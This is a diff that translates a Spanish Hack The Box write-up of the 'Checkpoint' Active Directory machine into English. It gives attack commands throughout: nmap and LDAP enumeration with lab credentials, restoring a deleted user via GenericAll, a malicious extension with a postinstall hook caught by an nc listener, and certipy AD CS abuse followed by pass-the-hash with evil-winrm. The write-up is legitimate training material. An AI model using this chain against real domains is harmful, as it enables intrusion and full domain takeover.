@@ -19,81 +19,81 @@
 <header class="nav">
   <a href="../../index.html" class="logo"><span class="bracket">[</span>AndrecoJS<span class="cursor">_</span><span class="bracket">]</span></a>
   <nav>
-    <a href="../../index.html#posts">publicaciones</a>
-    <a href="../../index.html#contact">contacto</a>
+    <a href="../../index.html#posts">Posts</a>
+    <a href="../../index.html#contact">Contact</a>
   </nav>
 </header>
 
 <main class="article">
-<a class="back" href="../../index.html#posts">← volver a publicaciones</a>
+<a class="back" href="../../index.html#posts">← return to posts</a>
 <header class="meta">
     
 
     <span class="kind">Write-up</span>
     <h1>HTB — Checkpoint</h1>
     <div class="sub">
-      <span>📅 16/06/2026</span>
+      <span>📅 06/16/2026</span>
       <span class="dot-sep">·</span>
-      <span>⏱️ 2 min de lectura</span>
+      <span>⏱️ 2 min read</span>
       <span class="dot-sep">·</span>
-      <span>🎯 Dificultad: Medium</span>
+      <span>🎯 Difficulty: Medium</span>
     </div>
     <div class="tags-mini">
       <span>HTB</span><span>Active Directory</span><span>Windows</span><span>AD CS</span><span>SMB</span><span>VSIX exploit</span>
     </div>
   </header>
-<p> Checkpoint es una máquina Active Directory que combina enumeración LDAP, abuso de permisos
-delegados, SMB y una escalada final mediante Active Directory Certificate Services (AD CS). Durante la
-resolución aprovecharemos permisos excesivos sobre un usuario eliminado para recuperar acceso a
-una cuenta privilegiada y posteriormente comprometer todo el dominio. </p>
-<h2>Reconocimiento</h2>
-<p>Comencé realizando un escaneo completo de puertos:</p>
+<p> Checkpoint is an Active Directory machine that combines LDAP enumeration, abuse of delegated
+permissions, SMB, and a final escalation via Active Directory Certificate Services (AD CS). During the
+process, we will leverage excessive permissions on a deleted user to regain access to
+a privileged account and subsequently compromise the entire domain. </p>
+<h2>Reconnaissance</h2>
+<p>I started by performing a full port scan:</p>
 <pre><code>nmap -p- --min-rate 5000 10.129.16.196 -oN init.nmap</code></pre>
-<p>Posteriormente ejecuté detección de servicios y scripts NSE:</p>
+<p>Next, I ran service detection and NSE scripts:</p>
 <pre><code>nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.129.16.196 -oN
 services.nmap</code></pre>
-<p>Los resultados muestran claramente que nos encontramos frente a un Domain Controller.</p>
+<p>The results clearly show that we are dealing with a Domain Controller.</p>
 <pre><code>53/tcp open dns 88/tcp open kerberos 389/tcp open ldap 445/tcp open microsoft-ds 5985/
 tcp open winrm 9389/tcp open adws</code></pre>
-<div class="callout"> <p> <strong>Hallazgo:</strong> la máquina expone múltiples servicios de Active
-Directory, incluyendo LDAP, Kerberos, SMB y WinRM. </p> </div>
-<h2>Enumeración LDAP</h2>
-<p>La máquina proporciona las siguientes credenciales iniciales:</p>
+<div class="callout"> <p> <strong>Finding:</strong> the machine exposes multiple Active
+Directory services, including LDAP, Kerberos, SMB, and WinRM. </p> </div>
+<h2>LDAP Enumeration</h2>
+<p>The machine provides the following initial credentials:</p>
 <pre><code>alex.turner : Checkpoint2024!</code></pre>
-<p>Con ellas realizamos una enumeración completa del dominio mediante ldapdomaindump.</p>
+<p>Using these, we perform a full domain enumeration via ldapdomaindump.</p>
 <pre><code>ldapdomaindump
 -u checkpoint.local\alex.turner
 -p 'Checkpoint2024!'
 ldap://10.129.16.196</code></pre>
-<p> Tras revisar los objetos del dominio y sus ACLs encontramos un hallazgo muy interesante. </p>
-<div class="callout"> <p> <strong>Hallazgo:</strong> el usuario <code>alex.turner</code> posee
-permisos <code>GenericAll</code> sobre el usuario <code>ryan.brooks</code>. </p> </div>
-<p> Al continuar revisando la información exportada observamos que <code>ryan.brooks</code> se
-encuentra eliminado dentro de Active Directory. </p>
-<p> Dado que contamos con permisos GenericAll sobre dicho objeto, procedemos a restaurar la cuenta
-y asignarle una nueva contraseña. </p>
-<p> Una vez recuperada la cuenta validamos el acceso al dominio utilizando las nuevas credenciales. </
+<p> After reviewing the domain objects and their ACLs, we came across a very interesting finding. </p>
+<div class="callout"> <p> <strong>Finding:</strong> the user <code>alex.turner</code> has
+<code>GenericAll</code> permissions over the user <code>ryan.brooks</code>. </p> </div>
+<p> Upon further review of the exported information, we observed that <code>ryan.brooks</code>
+is deleted within Active Directory. </p>
+<p> Given that we have GenericAll permissions over this object, we proceed to restore the account
+and assign it a new password. </p>
+<p> Once the account is recovered, we validate domain access using the new credentials. </
 p>
-<h2>Enumeración SMB</h2>
-<p>Con la cuenta restaurada comenzamos la enumeración de recursos compartidos.</p>
+<h2>SMB Enumeration</h2>
+<p>With the account restored, we begin enumerating shared resources.</p>
 <pre><code>smbclient -L //10.129.16.196 -U ryan.brooks</code></pre>
-<p>Entre los recursos disponibles encontramos uno particularmente interesante:</p>
+<p>Among the available resources, we find one that is particularly interesting:</p>
 <pre><code>DevDrop</code></pre>
-<p>Accedemos al recurso:</p>
+<p>We access the resource:</p>
 <pre><code>smbclient //10.129.16.196/DevDrop -U ryan.brooks</code></pre>
-<p> Tras revisar los archivos presentes observamos documentación y configuraciones relacionadas con
-un sistema automatizado de despliegue de extensiones. </p>
-<div class="callout"> <p> <strong>Hallazgo:</strong> la cuenta <code>ryan.brooks</code> posee
-permisos de escritura sobre <code>DevDrop</code>. </p> </div>
-<p> El servicio monitoriza continuamente nuevos paquetes, los extrae y ejecuta procesos de instalación
-automáticamente. </p>
-<h2>Obtención del Acceso Inicial</h2>
-<p> Analizando el mecanismo de despliegue descubrimos que las extensiones son simplemente
-archivos comprimidos que pueden incluir scripts de instalación. </p>
-<p> Uno de los eventos soportados es: </p>
+<p> Upon reviewing the existing files, we observed documentation and configurations related to
+an automated extension deployment system. </p>
+<div class="callout"> <p> <strong>Finding:</strong> the <code>ryan.brooks</code> account has
+write permissions for <code>DevDrop</code>. </p> </div>
+<p> The service continuously monitors for new packages, extracts them, and automatically
+executes installation processes. </p>
+<h2>Gaining Initial Access</h2>
+<p> By analyzing the deployment mechanism, we discovered that extensions are simply
+compressed files that can include installation scripts. </p>
+<p> One of the supported events is: </p>
 <pre><code>"postinstall"</code></pre>
-<p> Esto nos permite ejecutar comandos arbitrarios cuando el sistema procesa la extensión. </p>
-<p>Creamos una extensión maliciosa:</p>
+<p> This allows us to execute arbitrary commands when the system processes the extension. </p>
+<p>We create a malicious extension:</p>
 <pre><code>
     { 
         "name": "checkpoint",
@@ -102,55 +102,53 @@ archivos comprimidos que pueden incluir scripts de instalación. </p>
     } }
 
 </code></pre>
-<p>Empaquetamos el contenido:</p>
+<p>We package the content:</p>
 <pre><code>zip -r exploit.zip .</code></pre>
-<p>Preparamos un listener:</p>
+<p>We set up a listener:</p>
 <pre><code>nc -lvnp 4444</code></pre>
-<p>Y subimos la extensión al recurso compartido:</p>
+<p>And upload the extension to the shared resource:</p>
 <pre><code>put exploit.extension</code></pre>
-<p> Tras unos segundos el proceso automatizado detecta el paquete, ejecuta el script de instalación y
-obtenemos una shell sobre el controlador de dominio. </p>
+<p> After a few seconds, the automated process detects the package, executes the installation script,
+and we obtain a shell on the domain controller. </p>
 <pre><code>type C:\Users\ryan.brooks\Desktop\user.txt</code></pre>
-<h2>Escalada de Privilegios</h2>
-<p> Con acceso inicial procedemos a enumerar el entorno Active Directory utilizando BloodHound y
+<h2>Privilege Escalation</h2>
+<p> With initial access, we proceed to enumerate the Active Directory environment using BloodHound and
 Certipy. </p>
 <pre><code>certipy find
 -u ryan.brooks
 -p '&ltPASSWORD&gt'
 -d checkpoint.local</code></pre>
-<p> La enumeración revela una plantilla vulnerable dentro de Active Directory Certificate Services. </p>
-<div class="callout warn"> <p> La plantilla permite especificar Subject Alternative Name (SAN),
-posibilitando solicitar certificados para cualquier usuario del dominio. </p> </div>
-<h2>Abuso de AD CS</h2>
-<p> Solicitamos un certificado para la cuenta Administrator. </p>
+<p> The enumeration reveals a vulnerable template within Active Directory Certificate Services. </p>
+<div class="callout warn"> <p> The template allows specifying a Subject Alternative Name (SAN),
+making it possible to request certificates for any user in the domain. </p> </div>
+<h2>AD CS Abuse</h2>
+<p> We request a certificate for the Administrator account. </p>
 <pre><code>certipy req
 -u ryan.brooks
 -p '&ltPASSWORD&gt'
 -template &ltTEMPLATE&gt
 -upn administrator@checkpoint.local</code></pre>
-<p>Como resultado obtenemos:</p>
+<p>The result is:</p>
 <pre><code>administrator.pfx</code></pre>
-<p> Posteriormente utilizamos dicho certificado para autenticarnos y recuperar el hash NTLM del
-administrador. </p>
+<p>We then use this certificate to authenticate and retrieve the administrator's NTLM hash.</p>
 <pre><code>certipy auth -pfx administrator.pfx</code></pre>
-<p> Con el hash en nuestro poder realizamos Pass-the-Hash utilizando Evil-WinRM. </p>
+<p>With the hash in hand, we perform a Pass-the-Hash attack using Evil-WinRM.</p>
 <pre><code>evil-winrm
 -i 10.129.16.196
 -u Administrator
 -H &ltNTLM_HASH&gt</code></pre>
-<h2>Compromiso Total</h2>
-<p> La autenticación es exitosa y obtenemos privilegios de Domain Administrator sobre el controlador
-de dominio. </p>
+<h2>Full Compromise</h2>
+<p>Authentication is successful, and we obtain Domain Administrator privileges on the domain controller.</p>
 <pre><code>type C:\Users\max.palmer\Desktop\root.txt</code></pre>
-<div class="callout"> <p> <strong>Pwned:</strong> compromiso completo del dominio mediante
-restauración de usuario eliminado, abuso de SMB y explotación de AD CS. </p> </div>
-<h2>Conclusión</h2>
-<p> Checkpoint demuestra cómo una mala delegación de permisos en Active Directory puede terminar
-comprometiendo por completo una organización. La cadena de explotación se basa en la recuperación
-del usuario eliminado <code>ryan.brooks</code> gracias a permisos <code>GenericAll</code> de
-<code>alex.turner</code>, el abuso del recurso compartido <code>DevDrop</code> para conseguir
-ejecución remota de código y finalmente una escalada crítica mediante una plantilla vulnerable de
-Active Directory Certificate Services. </p>
+<div class="callout"> <p> <strong>Pwned:</strong> full domain compromise via
+restoration of a deleted user, SMB abuse, and AD CS exploitation. </p> </div>
+<h2>Conclusion</h2>
+<p>Checkpoint demonstrates how poor permission delegation in Active Directory can lead to the
+complete compromise of an organization. The exploitation chain relies on recovering the deleted
+user <code>ryan.brooks</code> thanks to <code>GenericAll</code> permissions held by
+<code>alex.turner</code>, abusing the <code>DevDrop</code> share to achieve
+remote code execution, and finally, a critical privilege escalation using a vulnerable
+Active Directory Certificate Services template. </p>
 </main>
 
 <footer>
